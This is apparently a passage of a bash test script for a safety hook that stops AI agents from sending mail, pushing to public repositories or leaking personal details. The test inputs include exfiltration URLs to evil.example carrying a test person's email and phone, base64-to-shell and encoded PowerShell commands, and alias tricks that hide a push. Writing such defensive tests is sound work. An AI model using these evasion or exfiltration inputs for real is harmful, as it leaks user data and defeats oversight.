#!/usr/bin/env bash
# Fixture tests for the safety guard (.claude/hooks/guard.sh or guard.ps1), the fail-closed hook
# wrappers in .claude/settings.json and .codex/hooks.json, and .githooks/pre-push.
# No network: a local mock (mock-github.py) stands in for the GitHub API, and the guard copies
# under test are pointed at it. Nothing in the workspace is changed; all work happens in a temp folder.
#
# Usage: bash scripts/ci/guard-fixtures.sh [--impl sh|ps] [--decisions FILE]
#   --impl sh   test guard.sh, the bash wrappers and pre-push (default)
#   --impl ps   test guard.ps1 and the Codex Windows wrappers (the base64 commandWindows strings);
#               PowerShell comes from $PS_EXE, else pwsh, else powershell
#   --decisions FILE   also write "<case name><TAB><decision>" for every shared case (parity checks)
# Works in macOS bash 3.2, Linux bash and Git Bash on Windows. Exits 1 if any case fails.
set -u
IMPL="sh"; DECISIONS=""
while [ $# -gt 0 ]; do
  case "$1" in
    --impl) IMPL="$2"; shift 2 ;;
    --decisions) DECISIONS="$2"; shift 2 ;;
    *) echo "unknown option $1" >&2; exit 2 ;;
  esac
done
case "$IMPL" in sh|ps) ;; *) echo "--impl must be sh or ps" >&2; exit 2 ;; esac

HERE="$(cd "$(dirname "$0")" && pwd -P)"
REPO="$(cd "$HERE/../.." && pwd -P)"
WIN=""; case "$(uname -s)" in MINGW*|MSYS*|CYGWIN*) WIN=1 ;; esac
native() { if command -v cygpath >/dev/null 2>&1; then cygpath -m "$1"; else printf '%s\n' "$1"; fi; }

PY=""
for c in python3 python; do "$c" -c 'import sys; sys.exit(0 if sys.version_info >= (3, 7) else 1)' >/dev/null 2>&1 && { PY="$c"; break; }; done
[ -n "$PY" ] || { echo "python 3.7+ is needed for the mock GitHub API" >&2; exit 2; }

PS=""
if [ "$IMPL" = ps ]; then
  PS="${PS_EXE:-}"
  [ -n "$PS" ] || { command -v pwsh >/dev/null 2>&1 && PS=pwsh; }
  [ -n "$PS" ] || { command -v powershell >/dev/null 2>&1 && PS=powershell; }
  [ -n "$PS" ] || { echo "no PowerShell found (set PS_EXE)" >&2; exit 2; }
fi

TMPBASE="${RUNNER_TEMP:-${TMPDIR:-/tmp}}"
command -v cygpath >/dev/null 2>&1 && TMPBASE="$(cygpath -u "$TMPBASE")"
T="$(mktemp -d "$TMPBASE/guardfx.XXXXXX")" || exit 2
T="$(cd "$T" && pwd -P)"
TN="$(native "$T")"          # the same folder as Windows programs (PowerShell, git.exe) see it
MOCKPID=""
cleanup() { if [ -n "$MOCKPID" ]; then kill "$MOCKPID" 2>/dev/null && wait "$MOCKPID" 2>/dev/null; fi; rm -rf "$T"; }
trap cleanup EXIT

# ---- mock GitHub API ----
"$PY" "$HERE/mock-github.py" "$T/port" & MOCKPID=$!
i=0; while [ ! -s "$T/port" ] && [ $i -lt 100 ]; do sleep 0.1; i=$((i + 1)); done
PORT="$(cat "$T/port" 2>/dev/null)"
[ -n "$PORT" ] || { echo "mock GitHub API did not start" >&2; exit 2; }
API="http://127.0.0.1:$PORT/repos/"

# Copies of the scripts under test, pointed at the mock. mock_copy <src> <dest> [api-base]
mock_copy() {
  mkdir -p "$(dirname "$2")"
  sed "s#https://api.github.com/repos/#${3:-$API}#g" "$1" > "$2"
  grep -q "${3:-$API}" "$2" || { echo "could not point $1 at the mock API (did its GitHub URL change?)" >&2; exit 2; }
}
G_SH="$REPO/.claude/hooks/guard.sh"; G_PS="$REPO/.claude/hooks/guard.ps1"; PREPUSH="$REPO/.githooks/pre-push"
if [ "$IMPL" = sh ]; then
  mock_copy "$G_SH" "$T/m/guard.sh"
  mock_copy "$G_SH" "$T/off/guard.sh" "http://127.0.0.1:1/repos/"
  mock_copy "$PREPUSH" "$T/m/hooks/pre-push"; chmod +x "$T/m/hooks/pre-push"
  mock_copy "$PREPUSH" "$T/off/pre-push" "http://127.0.0.1:1/repos/"
  RUN_DEFAULT="bash \"$T/m/guard.sh\""
  RUN_OFF="bash \"$T/off/guard.sh\""
else
  mock_copy "$G_PS" "$T/m/guard.ps1"
  mock_copy "$G_PS" "$T/off/guard.ps1" "http://127.0.0.1:1/repos/"
  PSA="-NoProfile -NonInteractive -ExecutionPolicy Bypass"
  RUN_DEFAULT="\"$PS\" $PSA -File \"$(native "$T/m/guard.ps1")\""
  RUN_OFF="\"$PS\" $PSA -File \"$(native "$T/off/guard.ps1")\""
fi
RUN="$RUN_DEFAULT"

# ---- fixtures ----
PUBURL="https://github.com/octocat/Hello-World.git"
PRIVURL="https://github.com/octocat/this-repo-does-not-exist-zz9.git"
ERRURL="https://github.com/octocat/server-error.git"
mkdir -p "$T/proj/profile"
printf 'Jordan Testerson\njordan@example.com\n(215) 867-5309\n' > "$T/proj/profile/signature.txt"
export CLAUDE_PROJECT_DIR="$TN/proj"
export GIT_CONFIG_NOSYSTEM=1 GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@example.com GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@example.com
mk() { mkdir -p "$T/$1" && git -C "$T/$1" init -q && { [ -z "$2" ] || git -C "$T/$1" remote add origin "$2"; }; }
mk pub "$PUBURL"
mk priv "$PRIVURL"
mk err "$ERRURL"
mk sshpub git@github.com:octocat/Hello-World.git
mk other https://gitlab.com/someone/something.git
mk none ""
mk multi ""; git -C "$T/multi" remote add backup "$PRIVURL"; git -C "$T/multi" remote add pubby "$PUBURL"

pass=0; fail=0; skipped=0
j() { printf '%s' "$1" | "$PY" -c 'import json,sys; sys.stdout.write(json.dumps(sys.stdin.read()))'; }
shelljson() { # shelljson <cwd> <command> [tool]
  printf '{"session_id":"x","hook_event_name":"PreToolUse","cwd":%s,"tool_name":"%s","tool_input":{"command":%s}}' \
    "$(j "$1")" "${3:-Bash}" "$(j "$2")"
}
record() { [ -z "$DECISIONS" ] || printf '%s\t%s\n' "$1" "$2" >> "$DECISIONS"; }
skip() { skipped=$((skipped + 1)); printf 'SKIP  %s (%s)\n' "$1" "$2"; }
# check <name> <expect: allow|deny|block2> <json>   (uses $RUN; stderr output on a non-block is a failure)
check() {
  local out rc got=allow
  out="$(printf '%s' "$3" | eval "$RUN" 2>"$T/stderr.txt")"; rc=$?
  if [ $rc -eq 2 ]; then got=block2
  elif [ $rc -ne 0 ]; then got="exit$rc"
  elif printf '%s' "$out" | grep -qE '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"'; then got=deny; fi
  if [ -s "$T/stderr.txt" ] && [ "$got" != block2 ]; then got="$got+stderr"; fi
  [ "$RUN" = "$RUN_DEFAULT" ] && record "$1" "$got"
  if [ "$got" = "$2" ]; then pass=$((pass + 1)); printf 'PASS  %-62s %s\n' "$1" "$got"
  else fail=$((fail + 1)); printf 'FAIL  %-62s expected %s got %s\n      out=%s\n      err=%s\n' "$1" "$2" "$got" "$out" "$(head -c 600 "$T/stderr.txt")"; fi
}
PU="pu""sh"   # keeps the literal word out of this file's own command lines

echo "== guard ($IMPL): mail / calendar / browser"
check "gmail search (allow)" allow '{"tool_name":"mcp__claude_ai_Gmail__search_threads","tool_input":{"query":"from:recruiter"}}'
check "gmail create_draft (allow)" allow '{"tool_name":"mcp__claude_ai_Gmail__create_draft","tool_input":{"to":"a@b.com"}}'
check "gmail send_message (deny)" deny '{"tool_name":"mcp__claude_ai_Gmail__send_message","tool_input":{"to":"a@b.com"}}'
check "gmail reply (deny)" deny '{"tool_name":"mcp__claude_ai_Gmail__reply","tool_input":{}}'
check "gmail trash (deny)" deny '{"tool_name":"mcp__claude_ai_Gmail__trash_thread","tool_input":{}}'
check "codex gmail_send_email (deny)" deny '{"tool_name":"mcp__gmail__gmail_send_email","tool_input":{}}'
check "codex gmail_search_emails (allow)" allow '{"tool_name":"mcp__gmail__gmail_search_emails","tool_input":{}}'
check "outlook send (deny)" deny '{"tool_name":"mcp__outlook__send_mail","tool_input":{}}'
check "calendar create, no attendees (allow)" allow '{"tool_name":"mcp__claude_ai_Google_Calendar__create_event","tool_input":{"summary":"Interview"}}'
check "calendar create, empty attendees (allow)" allow '{"tool_name":"mcp__claude_ai_Google_Calendar__create_event","tool_input":{"summary":"Interview","attendees":[]}}'
check "calendar create with attendees (deny)" deny '{"tool_name":"mcp__claude_ai_Google_Calendar__create_event","tool_input":{"attendees":["x@y.com"]}}'
check "calendar create with attendees, pretty JSON (deny)" deny $'{"tool_name":"mcp__claude_ai_Google_Calendar__create_event",\n "tool_input":{"attendees":[\n  "x@y.com"]}}'
check "calendar delete (deny)" deny '{"tool_name":"mcp__claude_ai_Google_Calendar__delete_event","tool_input":{}}'
check "calendar respond (deny)" deny '{"tool_name":"mcp__claude_ai_Google_Calendar__respond_to_event","tool_input":{}}'
check "calendar list (allow)" allow '{"tool_name":"mcp__claude_ai_Google_Calendar__list_events","tool_input":{}}'
check "browser to linkedin (deny)" deny '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://www.linkedin.com/feed"}}'
check "browser to gmail (deny)" deny '{"tool_name":"mcp__Claude_Browser__navigate","tool_input":{"url":"https://mail.google.com/mail/u/0"}}'
check "browser to job site (allow)" allow '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://jobs.example.com/x"}}'
check "browser form fill with gmail address (allow)" allow '{"tool_name":"mcp__claude-in-chrome__form_input","tool_input":{"value":"someone@gmail.com"}}'
check "codex node_repl mentioning linkedin (deny)" deny '{"tool_name":"mcp__node_repl__js","tool_input":{"code":"await page.goto(\"https://linkedin.com\")"}}'
check "computer-use opening Mail app (deny)" deny '{"tool_name":"mcp__computer-use__open_application","tool_input":{"app":"Mail"}}'
check "unrelated mcp tool (allow)" allow '{"tool_name":"mcp__interview-room__interview_say","tool_input":{"text":"hi"}}'
check "unicode in input (allow)" allow '{"tool_name":"mcp__interview-room__interview_say","tool_input":{"text":"caf\u00e9 \u2014 ok \u00b7 \u00e9"}}'
check "Calendly cancel_event (deny)" deny '{"tool_name":"mcp__claude_ai_Calendly__meetings-cancel_event","tool_input":{"uuid":"x"}}'
check "Calendly create_invitee (deny)" deny '{"tool_name":"mcp__claude_ai_Calendly__meetings-create_invitee","tool_input":{"email":"x@y.com"}}'
check "Calendly list_event_types (allow)" allow '{"tool_name":"mcp__claude_ai_Calendly__event_types-list_event_types","tool_input":{}}'
check "Calendly load skill (allow)" allow '{"tool_name":"mcp__claude_ai_Calendly__load_calendly_skill","tool_input":{"name":"x"}}'
check "Zoom meeting_create, nobody invited (allow)" allow '{"tool_name":"mcp__claude_ai_Zoom_for_Claude__meeting_create","tool_input":{"topic":"Practice"}}'
check "Zoom meeting_create with meeting_invitees (deny)" deny '{"tool_name":"mcp__claude_ai_Zoom_for_Claude__meeting_create","tool_input":{"topic":"x","settings":{"meeting_invitees":[{"email":"x@y.com"}]}}}'
check "Zoom meeting_update (deny)" deny '{"tool_name":"mcp__claude_ai_Zoom_for_Claude__meeting_update","tool_input":{}}'
check "Zoom search_meetings (allow)" allow '{"tool_name":"mcp__claude_ai_Zoom_for_Claude__search_meetings","tool_input":{}}'
check "calendar create with optional_attendees (deny)" deny '{"tool_name":"mcp__claude_ai_Google_Calendar__create_event","tool_input":{"summary":"x","optional_attendees":["a@b.com"]}}'
check "calendar create with guest_emails (deny)" deny '{"tool_name":"mcp__gcal__create_event","tool_input":{"summary":"x","guest_emails":"a@b.com"}}'
check "calendar create with participants (deny)" deny '{"tool_name":"mcp__cal__create_event","tool_input":{"participants":[{"email":"a@b.com"}]}}'
check "calendar create, guestsCanInviteOthers false (allow)" allow '{"tool_name":"mcp__claude_ai_Google_Calendar__create_event","tool_input":{"summary":"x","guestsCanInviteOthers":false}}'
check "mail tool without mail in name: messages_send (deny)" deny '{"tool_name":"mcp__nylas__messages_send","tool_input":{}}'
check "graph sendMessage (deny)" deny '{"tool_name":"mcp__msgraph__sendMessage","tool_input":{}}'
check "chat post_reply (deny)" deny '{"tool_name":"mcp__chat__post_reply","tool_input":{}}'
check "drive trash_file (deny)" deny '{"tool_name":"mcp__claude_ai_Google_Drive__trash_file","tool_input":{}}'
check "read tool with send in its name (allow)" allow '{"tool_name":"mcp__claude_ai_Superhuman_Mail__get_draft_send_status","tool_input":{}}'
check "Chrome computer tool typing gmail address bar (deny)" deny '{"tool_name":"mcp__claude-in-chrome__computer","tool_input":{"action":"type","text":"mail.google.com"}}'
check "Chrome javascript_tool atob to gmail (deny)" deny '{"tool_name":"mcp__claude-in-chrome__javascript_tool","tool_input":{"text":"window.location=atob(\"bWFpbC5nb29nbGUuY29t\")"}}'
check "javascript fromCharCode navigation (deny)" deny '{"tool_name":"mcp__claude-in-chrome__javascript_tool","tool_input":{"text":"location.href=String.fromCharCode(104,116)"}}'
check "browser to google redirect to gmail (deny)" deny '{"tool_name":"mcp__Claude_Browser__navigate","tool_input":{"url":"https://www.google.com/url?q=https%3A%2F%2Fmail%2Egoogle%2Ecom%2F"}}'
check "browser to linkedin.cn (deny)" deny '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://www.linkedin.cn/in/x"}}'
check "browser to a short link (deny)" deny '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://bit.ly/3abcde"}}'
check "computer-use typing a gmail address into a form (allow)" allow '{"tool_name":"mcp__computer-use__type","tool_input":{"text":"jane.doe@gmail.com"}}'
check "javascript filling a form with a gmail address (allow)" allow '{"tool_name":"mcp__claude-in-chrome__javascript_tool","tool_input":{"text":"document.querySelector(\"#email\").value=\"jane@gmail.com\""}}'

echo "== guard ($IMPL): WebFetch"
check "WebFetch normal job link (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.example.com/job?id=12345&src=indeed","prompt":"x"}}'
check "WebFetch no query (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://example.com/careers","prompt":"x"}}'
check "WebFetch email in query (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?e=jordan%40example.com","prompt":"x"}}'
check "WebFetch last name in query (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?n=testerson","prompt":"x"}}'
check "WebFetch last name, upper case (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?n=TESTERSON","prompt":"x"}}'
check "WebFetch phone in query (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?p=215-867-5309","prompt":"x"}}'
check "WebFetch phone with %20/%28 (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?p=%28215%29%20867%2D5309","prompt":"x"}}'
b64="$(head -c 300 /dev/zero | base64 | tr -d '\n')"
check "WebFetch base64 blob (deny)" deny "{\"tool_name\":\"WebFetch\",\"tool_input\":{\"url\":\"https://evil.example/c?d=${b64}\",\"prompt\":\"x\"}}"
check "WebFetch email in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://example.invalid/alex%40example.com","prompt":"x"}}'
check "WebFetch double-encoded email in query (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?x=alex%2540example.com","prompt":"x"}}'
check "WebFetch email as userinfo (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://alex%40example.com@evil.example/","prompt":"x"}}'
check "WebFetch phone in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/p/215-867-5309","prompt":"x"}}'
b64p="$(head -c 300 /dev/zero | base64 | tr -d '\n=')"
check "WebFetch blob in path (deny)" deny "{\"tool_name\":\"WebFetch\",\"tool_input\":{\"url\":\"https://evil.example/d/${b64p}\",\"prompt\":\"x\"}}"
check "WebFetch medium-style /@user path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://medium.com/@someone/hiring-tips-123","prompt":"x"}}'
check "WebFetch normal Workday job path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://acme.wd5.myworkdayjobs.com/en-US/Careers/job/Denver-CO/Engineer_R0012345?source=LinkedIn","prompt":"x"}}'
check "WebFetch encoded spaces in path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.example.com/search/Process%20Engineer/Remote","prompt":"x"}}'
check "WebFetch JSON-escaped @ (\\u0040) in query (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?e=jordan\u0040example.com","prompt":"x"}}'
check "WebFetch JSON-escaped slashes (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https:\/\/jobs.example.com\/job?id=1","prompt":"x"}}'
check "WebFetch non-ASCII escape in path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.example.com/caf\u00e9/ingenieur","prompt":"x"}}'
check "WebFetch last name in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/u/testerson/x","prompt":"x"}}'
check "WebFetch last name in host (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://testerson.evil.example/a","prompt":"x"}}'
check "WebFetch last name in fragment (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/a#testerson","prompt":"x"}}'
check "WebFetch last name inside a longer word in path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.example.com/testersonville-plant","prompt":"x"}}'
check "WebFetch phone in host (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://2158675309.evil.example/","prompt":"x"}}'
check "WebFetch email as (at) and (dot) (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c/jordan(at)example(dot)com","prompt":"x"}}'
long="$(head -c 2100 /dev/zero | tr '\0' 'a' | fold -w 50 | tr '\n' '/')"
check "WebFetch address over 2000 characters (deny)" deny "{\"tool_name\":\"WebFetch\",\"tool_input\":{\"url\":\"https://evil.example/${long}\",\"prompt\":\"x\"}}"
check "WebFetch very long host (deny)" deny "{\"tool_name\":\"WebFetch\",\"tool_input\":{\"url\":\"https://$(head -c 120 /dev/zero | tr '\0' 'b').evil.example/\",\"prompt\":\"x\"}}"

echo "== guard ($IMPL): shell commands"
check "Bash ls (allow)" allow "$(shelljson "$TN/pub" 'ls -la')"
check "Bash git status (allow)" allow "$(shelljson "$TN/pub" 'git status')"
check "Bash echo mentioning the word (allow)" allow "$(shelljson "$TN/pub" "echo $PU the button")"
check "git $PU origin main, public (deny)" deny "$(shelljson "$TN/pub" "git $PU origin main")"
check "bare git $PU, public (deny)" deny "$(shelljson "$TN/pub" "git $PU")"
check "git $PU -u origin, ssh URL public (deny)" deny "$(shelljson "$TN/sshpub" "git $PU -u origin main")"
check "cd X && git $PU, public (deny)" deny "$(shelljson "$TN" "cd pub && git $PU")"
check "git -C dir $PU, public (deny)" deny "$(shelljson "$TN" "git -C $TN/pub $PU origin HEAD")"
check "git -c k=v $PU, public (deny)" deny "$(shelljson "$TN/pub" "git -c user.name=x $PU origin main")"
check "git -C relative $PU, public (deny)" deny "$(shelljson "$TN" "git -C pub $PU")"
check "git $PU <public URL> (deny)" deny "$(shelljson "$TN/none" "git $PU $PUBURL main")"
check "git $PU, two remotes one public (deny)" deny "$(shelljson "$TN/multi" "git $PU")"
check "git $PU backup (private remote) (allow)" allow "$(shelljson "$TN/multi" "git $PU backup main")"
check "git $PU to private/missing GitHub (allow)" allow "$(shelljson "$TN/priv" "git $PU origin main")"
check "git $PU, GitHub answers 500 (deny unknown)" deny "$(shelljson "$TN/err" "git $PU origin main")"
check "git $PU to gitlab (allow)" allow "$(shelljson "$TN/other" "git $PU origin main")"
check "git $PU, no remotes (allow)" allow "$(shelljson "$TN/none" "git $PU")"
check "gh repo create --public (deny)" deny "$(shelljson "$TN" "gh repo create my-jobs --public --source . --$PU")"
check "gh repo create --private (allow)" allow "$(shelljson "$TN/none" 'gh repo create my-jobs --private')"
check "gh repo edit --visibility public (deny)" deny "$(shelljson "$TN" 'gh repo edit me/x --visibility public')"
check "gh repo edit --visibility=public (deny)" deny "$(shelljson "$TN" 'gh repo edit --visibility=public')"
check "Codex local_shell argv form, public (deny)" deny "{\"tool_name\":\"local_shell\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"command\":[\"bash\",\"-lc\",\"git $PU origin main\"]}}"
check "Codex exec_command string, public (deny)" deny "{\"tool_name\":\"exec_command\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"command\":\"git $PU\"}}"
check "Codex shell_command git.exe $PU, public (deny)" deny "$(shelljson "$TN/pub" "git.exe $PU origin main" shell_command)"
check "Codex unified_exec cmd field (deny)" deny "{\"tool_name\":\"unified_exec\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"cmd\":\"git $PU\"}}"
check "Codex cmd field string, gh repo create --public (deny)" deny "{\"tool_name\":\"exec_command\",\"cwd\":$(j "$TN"),\"tool_input\":{\"cmd\":\"gh repo create example --public\"}}"
check "Codex cmd field, ls (allow)" allow "{\"tool_name\":\"exec_command\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"cmd\":\"ls -la\"}}"
check "Codex cmd list with spaces, public (deny)" deny "{\"tool_name\":\"shell\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"cmd\":[\"bash\", \"-lc\", \"git $PU\"]}}"
check "shell tool, no command field, mentions $PU (deny)" deny "{\"tool_name\":\"Bash\",\"tool_input\":{\"script\":\"git $PU\"}}"
check "shell tool, no command field, harmless (allow)" allow '{"tool_name":"Bash","tool_input":{"script":"ls"}}'
check "unicode-escaped git p\\u0075sh, public (deny)" deny "{\"tool_name\":\"Bash\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"command\":\"git p\\u0075sh origin main\"}}"
check "literal backslash-u in a $PU-free command (allow)" allow "{\"tool_name\":\"Bash\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"command\":\"printf '\\\\u2019' > /dev/null\"}}"
check "PowerShell tool: git $PU, public (deny)" deny "$(shelljson "$TN/pub" "git $PU origin main" PowerShell)"
check "PowerShell tool: Set-Location X; git $PU, public (deny)" deny "$(shelljson "$TN" "Set-Location pub; git $PU" PowerShell)"
check "PowerShell tool: Set-Location -Path X; git $PU (deny)" deny "$(shelljson "$TN" "Set-Location -Path pub; git $PU origin main" PowerShell)"
check "PowerShell tool: sl X; git $PU, public (deny)" deny "$(shelljson "$TN" "sl pub; git $PU" PowerShell)"
check "PowerShell tool: Push-Location X; git $PU (deny)" deny "$(shelljson "$TN" "Push-Location pub; git $PU" PowerShell)"
check "PowerShell tool: cd X; git $PU, public (deny)" deny "$(shelljson "$TN" "cd pub; git $PU" PowerShell)"
check "PowerShell tool: git -C X $PU, public (deny)" deny "$(shelljson "$TN" "git -C pub $PU" PowerShell)"
check "PowerShell tool: & git $PU, public (deny)" deny "$(shelljson "$TN/pub" "& git $PU origin main" PowerShell)"
check "PowerShell tool: & 'C:\\Git\\bin\\git.exe' $PU (deny)" deny "$(shelljson "$TN/pub" "& 'C:\\Program Files\\Git\\bin\\git.exe' $PU origin main" PowerShell)"
check "PowerShell tool: gh repo create --public (deny)" deny "$(shelljson "$TN" "gh repo create my-jobs --public" PowerShell)"
check "PowerShell tool: git $PU to private (allow)" allow "$(shelljson "$TN/priv" "git $PU origin main" PowerShell)"
check "PowerShell tool: Get-ChildItem (allow)" allow "$(shelljson "$TN/pub" 'Get-ChildItem -Force' PowerShell)"
check "Windows path C:\\\\Users with repo word (allow)" allow "{\"tool_name\":\"Bash\",\"cwd\":$(j "$TN/none"),\"tool_input\":{\"command\":\"ls C:\\\\Users\\\\repo\"}}"

echo "== guard ($IMPL): shell commands, harder cases"
mk aliased "$PUBURL"
git -C "$T/aliased" config alias.ship "$PU"
git -C "$T/aliased" config alias.shipall "!git $PU"
git -C "$T/aliased" config alias.st status
check "Codex cmd list, spaces around commas, public (deny)" deny "{\"tool_name\":\"shell\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"cmd\":[ \"bash\" , \"-lc\" , \"git $PU\" ]}}"
check "Codex cmd list, spaces around commas, ls (allow)" allow "{\"tool_name\":\"shell\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"cmd\":[ \"bash\" , \"-lc\" , \"ls\" ]}}"
check "gh repo create --public=true (deny)" deny "$(shelljson "$TN" 'gh repo create demo --public=true')"
check "Codex list: gh repo create --public=true (deny)" deny "{\"tool_name\":\"exec_command\",\"cwd\":$(j "$TN"),\"tool_input\":{\"cmd\":[\"gh\",\"repo\",\"create\",\"demo\",\"--public=true\"]}}"
check "PowerShell tool: GH.EXE repo create --public (deny)" deny "$(shelljson "$TN" 'GH.EXE repo create demo --public' PowerShell)"
check "GIT.EXE $PU, public (deny)" deny "$(shelljson "$TN/pub" "GIT.EXE $PU origin main" PowerShell)"
check "git -c remote.origin.url=<public> $PU (deny)" deny "$(shelljson "$TN/priv" "git -c remote.origin.url=$PUBURL $PU origin main")"
check "git -c url...pushInsteadOf rewrite to public (deny)" deny "$(shelljson "$TN/priv" "git -c url.https://github.com/octocat/Hello-World.git.pushInsteadOf=$PRIVURL $PU origin main")"
check "git -c alias.up=$PU up, public (deny)" deny "$(shelljson "$TN/pub" "git -c alias.up=$PU up origin main")"
check "git alias from config for $PU, public (deny)" deny "$(shelljson "$TN/aliased" 'git ship origin main')"
check "git shell alias running $PU, public (deny)" deny "$(shelljson "$TN/aliased" 'git shipall')"
check "git alias for status (allow)" allow "$(shelljson "$TN/aliased" 'git st')"
check "git log (allow)" allow "$(shelljson "$TN/pub" 'git log --oneline -5')"
check "git subtree $PU, public (deny)" deny "$(shelljson "$TN/pub" "git subtree $PU --prefix=dist origin main")"
check "git send-pack <public URL> (deny)" deny "$(shelljson "$TN/none" "git send-pack $PUBURL main")"
check "git $PU \$REMOTE variable (deny unread)" deny "$(shelljson "$TN/pub" "git $PU \$REMOTE main")"
check "git $PU to GitHub.com upper case, public (deny)" deny "$(shelljson "$TN/none" "git $PU https://GitHub.com/octocat/Hello-World.git main")"
check "gh gist create --public (deny)" deny "$(shelljson "$TN" 'gh gist create notes.md --public')"
check "gh gist create -p (deny)" deny "$(shelljson "$TN" 'gh gist create -p notes.md')"
check "gh gist create, secret (allow)" allow "$(shelljson "$TN/none" 'gh gist create notes.md')"
check "gh api PATCH private=false (deny)" deny "$(shelljson "$TN" 'gh api -X PATCH repos/me/jobs -F private=false')"
check "gh api PATCH visibility=public (deny)" deny "$(shelljson "$TN" 'gh api --method PATCH repos/me/jobs -f visibility=public')"
check "gh api with --input to a repos endpoint (deny unread)" deny "$(shelljson "$TN" 'gh api -X POST user/repos --input body.json')"
check "gh api read (allow)" allow "$(shelljson "$TN/none" 'gh api repos/me/jobs')"
check "base64 decoded into sh (deny hidden)" deny "$(shelljson "$TN/pub" 'echo Z2l0IHB1c2g= | base64 -d | sh')"
check "eval with base64 (deny hidden)" deny "$(shelljson "$TN/pub" 'eval "$(echo Z2l0IHB1c2g= | base64 --decode)"')"
check "PowerShell -EncodedCommand (deny hidden)" deny "$(shelljson "$TN/pub" 'powershell -EncodedCommand ZwBpAHQA' PowerShell)"
check "PowerShell FromBase64String + iex (deny hidden)" deny "$(shelljson "$TN/pub" 'iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)))' PowerShell)"
check "PowerShell Get-Content -Encoding UTF8 (allow)" allow "$(shelljson "$TN/pub" 'Get-Content -Encoding UTF8 jobs/tracker.csv' PowerShell)"
check "base64 encode a file, no shell (allow)" allow "$(shelljson "$TN/pub" 'base64 -i photo.png -o photo.txt')"

echo "== guard ($IMPL): input shape"
check "empty stdin (deny)" deny ''
check "whitespace-only stdin (deny)" deny $'  \n'
check "empty object {} (deny)" deny '{}'
check "no tool_name (deny)" deny '{"tool_input":{"command":"ls"}}'
check "not JSON at all (deny)" deny 'hello'
check "malformed JSON gmail send (deny)" deny '{"tool_name":"mcp__claude_ai_Gmail__send_message","tool_input":{'
check "BOM-prefixed JSON gmail send (deny)" deny $'\xef\xbb\xbf{"tool_name":"mcp__claude_ai_Gmail__send_message","tool_input":{}}'

echo "== guard ($IMPL): GitHub SSH alias (from ~/.ssh/config)"
if [ "$IMPL" = ps ] && [ -n "$WIN" ]; then
  skip "SSH alias cases" "PowerShell on Windows runs the system ssh.exe, which can't be pointed at a test ssh config"
elif ! command -v ssh >/dev/null 2>&1; then
  skip "SSH alias cases" "no ssh client"
else
  mkdir -p "$T/bin"
  printf 'Host github-work\n  HostName github.com\n  User git\nHost myserver\n  HostName example.com\n' > "$T/sshconfig"
  printf '#!/bin/sh\nexec "%s" -F "%s" "$@"\n' "$(command -v ssh)" "$T/sshconfig" > "$T/bin/ssh"; chmod +x "$T/bin/ssh"
  OLDPATH="$PATH"; export PATH="$T/bin:$PATH"
  mk alias "git@github-work:octocat/Hello-World.git"
  mk aliasurl "ssh://git@github-work/octocat/Hello-World.git"
  mk aliaspriv "git@github-work:octocat/this-repo-does-not-exist-zz9.git"
  mk othersrv "git@myserver:me/jobs.git"
  mk localpath "$T/bare-local.git"
  check "SSH alias for GitHub, public (deny)" deny "$(shelljson "$TN/alias" "git $PU origin main")"
  check "ssh:// alias for GitHub, public (deny)" deny "$(shelljson "$TN/aliasurl" "git $PU")"
  check "SSH alias for GitHub, private (allow)" allow "$(shelljson "$TN/aliaspriv" "git $PU origin main")"
  check "SSH alias for another server (allow)" allow "$(shelljson "$TN/othersrv" "git $PU origin main")"
  check "local folder remote (allow)" allow "$(shelljson "$TN/localpath" "git $PU origin main")"
  export PATH="$OLDPATH"
fi

echo "== guard ($IMPL): GitHub unreachable"
RUN="$RUN_OFF"
check "offline, git $PU to GitHub remote (deny unknown)" deny "$(shelljson "$TN/priv" "git $PU origin main")"
check "offline, git $PU to gitlab (allow, not checked)" allow "$(shelljson "$TN/other" "git $PU origin main")"
check "offline, Bash ls (allow)" allow "$(shelljson "$TN/pub" 'ls')"
RUN="$RUN_DEFAULT"

if [ "$IMPL" = ps ]; then
  echo "== guard.ps1: an unexpected error while checking"
